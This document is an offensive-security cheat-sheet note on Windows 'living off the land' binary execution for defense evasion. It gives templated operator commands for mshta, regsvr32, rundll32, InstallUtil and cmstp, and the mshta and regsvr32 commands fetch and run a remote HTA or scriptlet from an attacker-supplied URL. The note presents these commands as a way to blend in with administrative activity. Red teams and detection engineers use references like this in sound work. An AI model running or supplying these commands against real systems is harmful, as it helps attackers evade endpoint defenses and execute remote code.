---
technique: Windows LOLBin Execution
category: defense-evasion
targets: Windows Workstation, Windows Server
protocols: Local, HTTP
remote_capable: true
tags: windows defense-evasion lolbin mshta regsvr32 rundll32 installutil cmstp
---

# Windows LOLBin Execution

LOLBin execution uses trusted Windows binaries to run scripts, DLL exports, or staged content in ways that may blend with administrative activity.

## Prerequisites

| Requirement | Detail |
|-------------|--------|
| Staged payload | Payload construction belongs in a tool or payload note |
| Binary availability | Not every LOLBin exists on every host |
| Egress | Remote scriptlet and HTA methods require target egress |

## Windows

### mshta URL

#cmd #mshta #lolbin

Run an HTA from a URL.

```cmd title:"Run remote HTA with mshta"
mshta.exe "$url"
```
<!-- cheat
var url
-->

### regsvr32 scriptlet

#cmd #regsvr32 #lolbin

Run a remote scriptlet with regsvr32.

```cmd title:"Run remote scriptlet with regsvr32"
regsvr32.exe /s /n /u /i:"$url" scrobj.dll
```
<!-- cheat
var url
-->

### rundll32 export

#cmd #rundll32 #lolbin

Run an exported function from a DLL.

```cmd title:"Run DLL export with rundll32"
rundll32.exe "$dll_path","$export_name"
```
<!-- cheat
var dll_path
var export_name
-->

### installutil assembly

#cmd #installutil #lolbin

Run a prepared .NET assembly with InstallUtil.

```cmd title:"Run assembly with InstallUtil"
InstallUtil.exe /logfile= /LogToConsole=false "$assembly_path"
```
<!-- cheat
var assembly_path
-->

### cmstp profile

#cmd #cmstp #lolbin

Install a prepared Connection Manager profile.

```cmd title:"Run CMSTP profile"
cmstp.exe /s "$inf_file"
```
<!-- cheat
var inf_file
-->

## Linux

No Linux operator command is included here. This note covers Windows LOLBin execution.
